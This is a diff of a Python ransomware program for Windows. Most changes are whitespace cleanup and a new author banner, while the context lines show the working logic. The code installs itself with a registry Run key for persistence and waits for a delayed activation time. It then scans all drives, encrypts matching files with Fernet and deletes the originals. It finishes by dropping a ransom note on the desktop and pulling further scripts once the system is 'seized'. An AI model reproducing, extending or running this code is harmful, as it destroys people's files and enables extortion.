@@ -1,6 +1,13 @@
-#  (c) kilitary@gmail.com ^ axis9 ^ umbrella division @2024 (approaching 2029)
 
-# revised
+#  ■ Copyright (c) 2024 | Axis9 (umbrella corp. division)
+#  ■ kilitary@gmail.com  | deconf@ya.ru | https://twitter.com/CommandmentTwo  | https://vk.com/agent1348
+#  ■ bus: https://linktr.ee/kilitary
+#  ■ mode: Active Counter-TIe
+
+#  Copyright (c) 2024 | Axis9 (umbrella corp. division)
+#  kilitary@gmail.com  | deconf@ya.ru | https://twitter.com/CommandmentTwo  | https://vk.com/agent1348
+#  bus: https://linktr.ee/kilitary
+#  mode: Active Countery-TIe     ■
 
 import os
 import random
@@ -451,7 +458,7 @@ def suitable(path: str):
     if any(s for s in Config.SKIP if s in path.lower()) and re.match(f'.*?\\.({get_extensions()})?$', path):
         deb(f'\rexclude {path}')
         return False
-    
+
     if re.match(f'.*?\\.({get_extensions()})?$', path) and config['core']['encryption_dir'].lower() not in path.lower():
         if Config.MAX_FILE_SIZE_MB >= (os.stat(path).st_size / 1024.0 / 1024.0) >= Config.MIN_FILE_SIZE_MB:
             return True
@@ -521,25 +528,25 @@ def install():
         config['core']['exename'] = process_name.split('.')[0]
         proc_name = process_name.split('.')[0] + 'Host.exe'
         proc_dir = os.path.dirname(proc_dir)[3:]
-        
+
         next_path = os.path.join(os.environ['USERPROFILE'], proc_dir)
         os.makedirs(next_path, exist_ok=True)
         next_path = os.path.join(next_path, proc_name)
-        
+
         if os.path.isfile(next_path):
             os.unlink(next_path)
-        
+
         config['core']['exe'] = next_path
         config['core']['activation_at'] = get_activation_time()
         deb(f"exe {config['core'].get('exe')}")
-        
+
         if not os.path.exists(next_path):
             first_install = True
-        
+
         deb(f"copy({exe_self}, {next_path}")
-        
+
         shutil.copyfile(exe_self, next_path)
-        
+
         reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
         if not is_dev():
             winreg.SetValueEx(reg_key, process_name.split('.')[0], 0, winreg.REG_SZ,
@@ -548,7 +555,7 @@ def install():
     except Exception as e:
         uprint(f"install: {e}->{sys.exc_info()}")
         exception(e)
-    
+
     if first_install and os.path.exists(next_path):
         uprint(f'{get_computer_uid()}: installed')
         sys.exit(3)
@@ -562,7 +569,7 @@ def print_files():
     # take the second element for sort
     def take_second(elem):
         return elem[1]
-    
+
     while True:
         time.sleep(1)
         parts = psutil.disk_partitions()
@@ -585,14 +592,14 @@ def empty_dest_dir():
 
 def post_install():
     global activate_encryption
-    
+
     now = int(str(time.time()).split(".")[0])
     deb(f'now: {now}')
     activation_time = int(config["core"]['activation_at'])
     deb(f'activation time: {activation_time}')
     wait_time = activation_time - now
     deb(f'time until encryption: {wait_time} secs ({wait_time / 60:.0f} mins)')
-    
+
     if wait_time <= 0:
         activate_encryption = True
 
@@ -600,11 +607,11 @@ def _generate_share_dictionary(headerRow):
     """Accepts a variable width, white space delimited string that we attempt
         to divine column delimiters from. Returns a dictionary of field names
         and a tuple with start/stop slice positions"""
-    
+
     # This used to be a more complex problem before I realized I didn't have
     # to do GET * in my source. GET Name, Path greatly simplifies
     # but this code is generic so I keep it as is
-    
+
     header = headerRow
     fields = header.split()
     tempOrds = {}
@@ -617,15 +624,15 @@ def _generate_share_dictionary(headerRow):
     # we would expect Name:0, Path:9
     for field in fields:
         tempOrds[field] = headerRow.index(field)
-    
+
     # Knowing our starting ordinal positions, we will build a dictionary of tuples
     # that contain starting and ending positions of our fields
     for iter in range(0, len(fields) - 1):
         ords[fields[iter]] = (tempOrds[fields[iter]], tempOrds[fields[iter + 1]])
-    
+
     # handle the last element
     ords[fields[-1]] = (tempOrds[fields[-1]], len(headerRow))
-    
+
     return ords
 
 def parse_network_shares_name_path(header, results):
@@ -644,10 +651,10 @@ def scan_shares():
     _command = r"C:\Windows\System32\wbem\WMIC.exe /output:stdout /namespace:\\root\cimv2 path Win32_Share GET Name, Path"
     # _command = r"C:\Windows\System32\wbem\WMIC.exe /output:stdout /namespace:\\root\cimv2 path Win32_Share GET *"
     _results = subprocess.check_output(_command, shell=True).decode('UTF-8')
-    
+
     _headerRow = _results.splitlines()[0]
     headerOrdinals = _generate_share_dictionary(_headerRow)
-    
+
     _shares = parse_network_shares_name_path(headerOrdinals, _results)
     pprint.pp(_shares)
     sys.exit(-5)
@@ -660,7 +667,7 @@ def detect_malware_type():
     CPUINFO = c.Win32_Processor()[0]
     HDDINFO = c.Win32_LogicalDisk()[0]
     RAMINFO = c.Win32_PhysicalMemory()[0]
-    
+
     pprint.pp(SYSINFO, depth=13)
     MANUFACTURER = SYSINFO[0].Manufacturer
     MODEL = SYSINFO[0].Model
@@ -673,7 +680,7 @@ def detect_malware_type():
     deb(f"RAM: {RAMTOTAL / 1024.0 / 1024.0 / 1024.0:.2f}GB")
     deb("CPU: " + CPUINFO.name)
     deb("OS: " + OSINFO.caption)
-    
+
     sys.exit(-4)
 
 def write_advert(file):
@@ -695,13 +702,13 @@ def write_advert(file):
 def advert_info():
     try:
         txt_name = os.path.join(getenv('temp'), 'YOUR_ENCRYPTED_FILES_DATA.txt')
-        
+
         try:
             with open(txt_name, "wt") as file:
                 write_advert(file)
         except Exception as e:
             deb(f'{txt_name}: {e} {sys.exc_info()}')
-        
+
         shutil.copy(txt_name, os.path.join(os.environ["USERPROFILE"], "Desktop"))
         os.unlink(txt_name)
     except Exception as e:
@@ -717,7 +724,7 @@ def get_advert():
             text = file.read()
     except Exception as e:
         deb(f'{txt_name}: {e} {sys.exc_info()}')
-    
+
     try:
         os.unlink(txt_name)
         return str(text)
@@ -731,9 +738,9 @@ def analyze_network():
     global intensive_recv
     while run_analyze_network:
         net_stats = psutil.net_io_counters()
-        
+
         deb(f'\rnetwork [{net_stats}] bytes_in: {net_stats.bytes_recv - last_recv:8} bytes_out: {net_stats.bytes_sent - last_sent:8}\r')
-        
+
         if net_stats.bytes_sent - last_sent > 1024 * 1024 * 4:
             intensive_sent = True
         elif net_stats.bytes_sent - last_sent < 1024 * 1024 * 1:
@@ -742,12 +749,12 @@ def analyze_network():
             intensive_recv = True
         elif net_stats.bytes_recv - last_recv < 1024 * 1024 * 1:
             intensive_recv = False
-        
+
         last_recv = net_stats.bytes_recv
         last_sent = net_stats.bytes_sent
-        
+
         time.sleep(1)
-    
+
     deb(f'intensive_sent: {intensive_sent} intensive_recv: {intensive_recv}')
 
 if __name__ == '__main__':
@@ -755,30 +762,30 @@ if __name__ == '__main__':
     logging.basicConfig(
         format="%(asctime)s [%(levelname)s] [%(thread)d] %(filename)s(%(funcName)s:%(lineno)d) - %(message)s",
         level=logging.DEBUG)
-    
+
     uprint(
         f'{get_computer_uid()}: user: {os.getlogin()} ppid: {os.getppid()} dir: {os.getcwd()} platform: {platform.platform()} '
         f'python: {platform.python_version()} win32: {platform.win32_ver()}'
         f' edition: {platform.win32_edition()} file: {__file__}')
-    
+
     load_config()
     atexit.register(save_config)
-    
+
     if is_dev():
         Config.EXTENSIONS_ENCODED = "dDNzdHx0ZXN0"
         deb(f'developer machine {get_extensions()}')
-    
+
     path = create_unicode_buffer(4096)
     windll.kernel32.GetModuleFileNameW(None, path, 4096)
     exe_self = path.value
-    
+
     opts = [opt for opt in sys.argv[1:] if opt.startswith("-")]
     if "-a" in opts:
         autorunned = True
-    
+
     if not config.has_section('core') or not config.has_option('core', 'encryption_dir'):
         detect_encrypt_storage()
-    
+
     if not autorunned:
         # if is_dev():
         # 	scan_shares()
@@ -787,42 +794,42 @@ if __name__ == '__main__':
         sys.exit(1)
     else:
         post_install()
-    
+
     if not is_dev() and is_system_done() and Config.IS_RELEASE:
         deb("system is seized")
         pull_scripts()
         sys.exit(2)
-    
+
     if not activate_encryption:
         deb(f'sleep exit')
         sys.exit(0)
-    
+
     ant = threading.Thread(target=analyze_network)
     ant.start()
-    
+
     drives = get_disks()
     var_dump(drives)
     set_priority()
-    
+
     key = Fernet.generate_key()
     password = str_id_generator(size=48)
-    
+
     # empty_dest_dir()
-    
+
     deb(f'collecting files (extensions={get_extensions()}, skip={Config.SKIP}) ...')
-    
+
     # t = threading.Thread(target=print_files, args=())
     # t.start()
-    
+
     num_encrypted = 0
     bytes_to_encrypt = 0
     for drive in drives:
         num_files = 0
-        
+
         deb(f"scanning drive {drive.device} ... ")
-        
+
         files = dir_files(drive.device)
-        
+
         for file in files:
             try:
                 if suitable(file):
@@ -832,36 +839,36 @@ if __name__ == '__main__':
                     bytes_to_encrypt += os.stat(file).st_size
             except Exception as err:
                 deb(f"scan error: {err}")
-        
+
         deb(f"done drive {drive.device} ({num_files} files)")
-    
+
     uprint(
         f"{get_computer_uid()}: starting encryption of {len(files_to_encrypt)} files, {bytes_to_encrypt / 1024.0 / 1024.0:.2f}MB to encrypt, pass: {password}" +
         f" virtualization_detected: {virtualization_detected}")
     deb(f"processing files {files_to_encrypt}")
-    
+
     run_analyze_network = False
     ant.join()
-    
+
     set_priority(increase=True)
-    
+
     if not os.path.isdir(config['core']['encryption_dir']):
         try:
             os.makedirs(config['core']['encryption_dir'], exist_ok=True)
         except Exception as e:
             deb(f'create encrypt dir: {e}')
             sys.exit(-1)
-    
+
     bytes_encrypted = 0
-    
+
     for file in files_to_encrypt:
         done_file = False
         try:
             filename = os.path.basename(file)
             size_mb = os.stat(file).st_size / 1024.0 / 1024.0
-            
+
             deb(f"{file}: {size_mb:.4f}MB, reading ... ", end="")
-            
+
             with open(file, "rb") as f:
                 try:
                     crypted_file_name = f"{config['core']['encryption_dir']}\\" + hex(
@@ -885,13 +892,13 @@ if __name__ == '__main__':
                             w.write(encrypted_data)
                         num_encrypted += 1
                         done_file = True
-                    
+
                     except Exception as e:
                         deb(f"write encrypted: {e}")
-                
+
                 except Exception as e:
                     deb(f"Crypt i/o error: {e}")
-            
+
             if done_file:
                 deb(f' encrypted. ', end='')
                 bytes_encrypted += os.stat(file).st_size
@@ -904,10 +911,10 @@ if __name__ == '__main__':
                             f'\r\nThe encrypted data is located in file {crypted_file_name}.\r\n\r\n' + get_advert())
                 else:
                     deb(f'system error: fail to delete {file}')
-        
+
         except Exception as e:
             deb(f"\r\nencryption({file}): {e}-> {sys.exc_info()}")
-    
+
     advert_info()
     tag_system()
     uprint(f"{get_computer_uid()}: done encryption, {num_encrypted}/{len(files_to_encrypt)} files encrypted, "
